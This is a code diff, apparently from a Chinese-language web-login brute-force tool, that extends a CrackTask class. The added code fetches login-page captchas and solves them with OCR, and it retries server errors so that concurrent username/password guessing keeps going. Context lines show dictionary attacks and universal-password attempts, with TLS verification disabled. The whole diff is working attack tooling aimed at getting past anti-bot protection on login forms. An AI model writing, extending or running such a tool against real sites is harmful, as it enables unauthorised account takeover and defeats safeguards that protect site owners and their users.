@@ -1,10 +1,16 @@
 import requests
+from http_requests import TaskStopped, request_with_timeout_retries
 import threading
 from copy import copy, deepcopy
 from contextlib import contextmanager
 from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
 from enum import Enum
 from parse.recognizers import json_path
+import captcha_solver
+
+
+class CaptchaSolveError(RuntimeError):
+    """验证码识别未成功；当前网站放弃继续尝试。"""
 
 
 class LoginState(Enum):
@@ -56,6 +62,7 @@ class CrackTask:
         self._json_sessions = None
         self._json_sessions_lock = threading.Lock()
         self.concurrency = crackConfig.get("concurrency", 5)
+        self._server_error_streak = 0
         if isinstance(self.concurrency, bool) or not isinstance(self.concurrency, int) or self.concurrency <= 0:
             raise ValueError("concurrency 必须是正整数")
 
@@ -71,6 +78,7 @@ class CrackTask:
             if not self.parser.run():
                 return
             self.error_length = self.get_error_length()
+            self._report_success_rule()
             username_dict, password_dict = gen_dict(url)
             username, password = self.crack_task(username_dict, password_dict)
             # 万能密码爆破
@@ -88,6 +96,10 @@ class CrackTask:
                 Log.Success(f"[+] Success: {url}  {username}/{password}")
                 return {"url": url, "username": username, "password": password}
             Log.Error("[-] Failed: " + url)
+        except TaskStopped:
+            Log.Info(f"[*] 任务已停止，跳过剩余请求: {url}")
+        except CaptchaSolveError as e:
+            Log.Error(f"[-] 跳过（验证码）: {url}: {e}")
         except Exception as e:
             Log.Error(f"{str(e)}")
         finally:
@@ -101,15 +113,159 @@ class CrackTask:
         data[self.parser.password_keyword] = password
         headers = get_random_headers()
         headers.update(getattr(self.parser,"request_headers",{}))
-        payload = {"data": data}
-        if getattr(self.parser, "request_format", "form") == "json":
-            headers["Content-Type"] = "application/json"
-            payload = {"json": data}
-        res = conn.post(url=path, **payload, headers=headers, timeout=self.timeout, verify=False,
-                        allow_redirects=True, proxies=self.requests_proxies)
+        captcha_required = bool(getattr(self.parser, "captcha_required", False))
+        # 验证码为一次性凭据，每次提交都重新获取并识别；若响应明确提示
+        # 验证码错误，则换一张重新识别后重发，避免把验证码失败当成密码失败。
+        # 5xx 多为瞬时服务端错误，同样有界重试，避免单次抖动终止整个站点。
+        captcha_left = captchaConfig.get("request_retries", 3) if captcha_required else 1
+        if not isinstance(captcha_left, int) or isinstance(captcha_left, bool) or captcha_left < 1:
+            captcha_left = 1
+        server_left = crackConfig.get("server_error_retries", 2)
+        if not isinstance(server_left, int) or isinstance(server_left, bool) or server_left < 0:
+            server_left = 0
+        res = None
+        while True:
+            if captcha_required:
+                data[self.parser.captcha_field] = self.solve_captcha(conn)
+            payload = {"data": data}
+            if getattr(self.parser, "request_format", "form") == "json":
+                headers["Content-Type"] = "application/json"
+                payload = {"json": data}
+            res = request_with_timeout_retries(
+                lambda: conn.post(url=path, **payload, headers=headers, timeout=self.timeout, verify=False,
+                                  allow_redirects=True, proxies=self.requests_proxies),
+                context=f"登录 POST {path}", stop_event=getattr(self, "_stop_event", None))
+            res.encoding = res.apparent_encoding
+            if server_left > 0 and 500 <= res.status_code < 600:
+                server_left -= 1
+                Log.Info(f"[*] {self.url} 登录响应 HTTP {res.status_code}，重新获取验证码后重试")
+                time.sleep(crackConfig["delay"])
+                continue
+            if captcha_required and captcha_left > 1 and self._captcha_rejected(res):
+                captcha_left -= 1
+                Log.Info(f"[*] {self.url} 验证码校验未通过，重新识别后重试")
+                time.sleep(crackConfig["delay"])
+                continue
+            break
         time.sleep(crackConfig["delay"])
         res.encoding = res.apparent_encoding
         return res
+
+    @staticmethod
+    def _is_server_error(res):
+        """5xx 多为单条凭据触发的服务端异常或瞬时故障，不等同于站点级失败。"""
+        code = getattr(res, "status_code", 0)
+        return isinstance(code, int) and 500 <= code < 600
+
+    def _server_error_limit(self):
+        limit = crackConfig.get("server_error_limit", 3)
+        if isinstance(limit, bool) or not isinstance(limit, int) or limit < 1:
+            return 1
+        return limit
+
+    def _register_server_error(self, status):
+        """记录一次“仅得到 5xx”的候选；返回是否应放弃该站点。"""
+        self._server_error_streak += 1
+        limit = self._server_error_limit()
+        Log.Info(f"[*] {self.url} 候选仅返回 HTTP {status}，跳过并继续"
+                 f"（连续 {self._server_error_streak}/{limit}）")
+        return self._server_error_streak >= limit
+
+    def _register_outcome(self):
+        self._server_error_streak = 0
+
+    def _captcha_rejected(self, res):
+        words = captchaConfig.get("captcha_fail_words", [])
+        if not words:
+            return False
+        body = (res.text or "").casefold()
+        return any(word and word.casefold() in body for word in words)
+
+    def _valid_captcha_text(self, text):
+        if not isinstance(text, str):
+            return False
+        text = text.strip()
+        if not text:
+            return False
+        # 页面声明了长度时按声明校验：长度不符的值会被服务端判为非法参数，
+        # 必须换图重识别，避免提交长度不符的值。
+        declared = getattr(self.parser, "captcha_length", None)
+        if isinstance(declared, int) and not isinstance(declared, bool) and declared > 0:
+            return len(text) == declared
+        minimum = captchaConfig.get("min_length", 1)
+        maximum = captchaConfig.get("max_length", 12)
+        return len(text) >= minimum and len(text) <= maximum
+
+    def fetch_captcha_image(self, conn):
+        """获取验证码图片字节；支持内联 data: URI 与站内相对地址。"""
+        url = getattr(self.parser, "captcha_image_url", "")
+        if not url:
+            return None
+        inline = captcha_solver.decode_data_uri(url)
+        if inline:
+            return inline
+        try:
+            res = request_with_timeout_retries(
+                lambda: conn.get(url, headers=get_random_headers(), timeout=self.timeout,
+                                 verify=False, proxies=self.requests_proxies),
+                context=f"验证码 GET {url}", stop_event=getattr(self, "_stop_event", None))
+        except TaskStopped:
+            raise
+        except requests.RequestException as exc:
+            Log.Info(f"[-] {self.url} 验证码请求异常: {exc}")
+            return None
+        if res.status_code != 200 or not res.content:
+            Log.Info(f"[-] {self.url} 验证码响应异常: HTTP {res.status_code}")
+            return None
+        return res.content
+
+    def solve_captcha(self, conn):
+        """重新获取验证码并调用 ddddocr 识别；多次失败后放弃当前网站。"""
+        field = getattr(self.parser, "captcha_field", "")
+        if not field:
+            raise CaptchaSolveError(f"{self.url} 缺少验证码字段映射")
+        retries = captchaConfig.get("solve_retries", 3)
+        if not isinstance(retries, int) or isinstance(retries, bool) or retries < 1:
+            retries = 3
+        for _ in range(retries):
+            image = self.fetch_captcha_image(conn)
+            text = captcha_solver.recognize(image) if image else None
+            if self._valid_captcha_text(text):
+                Log.Info(f"[*] {self.url} ddddocr 识别验证码: {text}")
+                return text.strip()
+        raise CaptchaSolveError(f"{self.url} ddddocr 验证码识别失败")
+
+    def _success_rule_sources(self):
+        """汇总当前生效的成功判定来源，便于定位“无明确规则即不确定”的情况。"""
+        parser = self.parser
+        sources = []
+        if getattr(parser, "profile_success_fields", None):
+            sources.append("profile_success_fields")
+        if getattr(parser, "json_response_success", None):
+            sources.append("script_rules")
+        profile_tokens = getattr(parser, "json_token_fields", None)
+        if profile_tokens:
+            sources.append("profile_token_fields")
+        if crackConfig.get("success_words"):
+            sources.append("success_words")
+        if crackConfig.get("json_success_fields"):
+            sources.append("json_success_fields")
+        if (profile_tokens is None and getattr(parser, "request_format", "form") == "json"
+                and not getattr(parser, "json_response_success", None)
+                and not getattr(parser, "profile_success_fields", None)
+                and crackConfig.get("json_token_fields")):
+            sources.append("default_token_fields")
+        if getattr(parser, "cms", None) and parser.cms.get("success_flag"):
+            sources.append("cms_success_flag")
+        return sources
+
+    def _report_success_rule(self):
+        sources = self._success_rule_sources()
+        if sources:
+            Log.Info(f"[*] 成功判定来源: {','.join(sources)}")
+        else:
+            Log.Info("[*] 未获得明确成功规则：命中将记为不确定；可用 success_words、"
+                     "json_success_fields 或 site_profiles 配置")
 
     def _success_evidence(self, res):
         evidence = set()
@@ -205,6 +361,7 @@ class CrackTask:
         try:
             with requests.session() as conn:
                 parser = Parser(self.url, session=conn)
+                parser.stop_event = getattr(self, "_stop_event", None)
                 refreshed = parser.refresh_from(previous) if isinstance(previous, _ParserType) else parser.run()
                 if not refreshed:
                     return None
@@ -243,17 +400,19 @@ class CrackTask:
         parser.session = conn
         for field in ("data", "request_headers", "cms", "json_token_fields",
                       "profile_success_fields", "json_response_success",
-                      "json_required_nonempty_fields"):
+                      "json_required_nonempty_fields", "captcha_required",
+                      "captcha_field", "captcha_image_url", "captcha_length"):
             if hasattr(parser, field):
                 setattr(parser, field, deepcopy(getattr(parser, field)))
         return parser
 
     @contextmanager
-    def _request_context(self):
+    def _request_context(self, stop=None):
         if getattr(self.parser, "request_format", "form") != "json":
             # 表单可能包含一次性 CSRF 字段，仍逐次刷新；静态脚本使用任务缓存。
             with requests.session() as conn:
                 parser = Parser(self.url, session=conn)
+                parser.stop_event = stop
                 refreshed = parser.refresh_from(self.parser) if isinstance(self.parser, _ParserType) else parser.run()
                 if not refreshed:
                     raise ValueError("登录表单刷新失败")
@@ -274,6 +433,7 @@ class CrackTask:
             conn = requests.session()
             try:
                 bootstrap = self._copy_request_plan(conn)
+                bootstrap.stop_event = stop
                 if getattr(bootstrap, "diagnostic_code", "") != "PROFILE_APPLIED":
                     # 每个工作线程只初始化一次页面 Cookie，不再解析页面/脚本。
                     if not bootstrap.refresh_from(self.parser):
@@ -286,6 +446,7 @@ class CrackTask:
                     self._json_sessions[thread_id] = (conn, bootstrap)
         if cached is not None and bootstrap.request_format != "json":
             refreshed = Parser(self.url, session=conn)
+            refreshed.stop_event = stop
             if not refreshed.refresh_from(bootstrap):
                 raise ValueError("已变化的登录表单刷新失败")
             bootstrap = refreshed
@@ -295,7 +456,8 @@ class CrackTask:
             # 不修改协调线程的 parser；每次独立复制线程内已刷新的规则。
             parser = copy(bootstrap)
             for field in ("data", "request_headers", "cms", "json_token_fields",
-                          "profile_success_fields", "json_response_success", "json_required_nonempty_fields"):
+                          "profile_success_fields", "json_response_success", "json_required_nonempty_fields",
+                          "captcha_required", "captcha_field", "captcha_image_url", "captcha_length"):
                 setattr(parser, field, deepcopy(getattr(bootstrap, field)))
             yield conn, parser
         finally:
@@ -308,20 +470,31 @@ class CrackTask:
         worker = CrackTask()
         worker.id, worker.url = self.id, self.url
         worker.baseline_responses = list(self.baseline_responses)
+        worker._stop_event = stop
         try:
             if stop.is_set():
                 return None
-            with self._request_context() as (conn, parser):
+            with self._request_context(stop) as (conn, parser):
                 worker.conn = conn
                 worker.parser = parser
                 if stop.is_set():
                     return None
                 res = worker.crack_request(conn, username, password)
                 state = worker.classify_response(res)
-                if state in (LoginState.STOPPED, LoginState.ERROR):
+                if state == LoginState.ERROR and self._is_server_error(res):
+                    # 单条凭据触发的服务端异常：标记后由协调线程跳过，不停止站点。
+                    worker.server_error = True
+                    worker.server_error_status = res.status_code
+                elif state in (LoginState.STOPPED, LoginState.ERROR):
                     stop.set()
                     Log.Info(f"[*] 停止当前任务: {state.value} HTTP {res.status_code}")
                 return state, username, password, worker
+        except TaskStopped:
+            # 任务已被其他候选停止；本次请求取消，不作为站点异常或新触发条件。
+            return None
+        except CaptchaSolveError:
+            stop.set()
+            raise
         except Exception as exc:
             stop.set()
             Log.Error(f"[-] 登录请求异常: {self.url}: {exc}")
@@ -361,8 +534,9 @@ class CrackTask:
                 done, _ = wait(pending, return_when=FIRST_COMPLETED)
                 pending.difference_update(done)
                 outcomes = [future.result() for future in done]
-                # 同一完成批次中限流/异常优先，避免忽略已观测的停止响应。
+                # 同一完成批次中限流/异常优先；仅凭据级 5xx 不停止站点。
                 if any(outcome and outcome[0] in (LoginState.STOPPED, LoginState.ERROR)
+                       and not getattr(outcome[3], "server_error", False)
                        for outcome in outcomes):
                     self.stopped = True
                     return False, False
@@ -370,6 +544,14 @@ class CrackTask:
                     if outcome is None:
                         continue
                     state, username, password, worker = outcome
+                    if state == LoginState.ERROR and getattr(worker, "server_error", False):
+                        status = getattr(worker, "server_error_status", 500)
+                        if self._register_server_error(status):
+                            self.stopped = True
+                            Log.Info("[*] 连续服务端错误，停止当前任务")
+                            return False, False
+                        continue
+                    self._register_outcome()
                     if state == LoginState.SUCCESS:
                         if stop.is_set():
                             self.stopped = True
@@ -407,9 +589,16 @@ class CrackTask:
                 res = self.crack_request(self.conn, username, password)
                 state = self.classify_response(res)
                 if state in (LoginState.STOPPED, LoginState.ERROR):
+                    if state == LoginState.ERROR and self._is_server_error(res):
+                        if self._register_server_error(res.status_code):
+                            self.stopped = True
+                            Log.Info("[*] 连续服务端错误，停止当前任务")
+                            return False, False
+                        continue
                     self.stopped = True
                     Log.Info(f"[*] 停止当前任务: {state.value} HTTP {res.status_code}")
                     return False, False
+                self._register_outcome()
                 if state == LoginState.SUCCESS:
                     # 复核失败后继续处理，而不是丢弃尚未检查的条目。
                     if self.recheck(username, password):
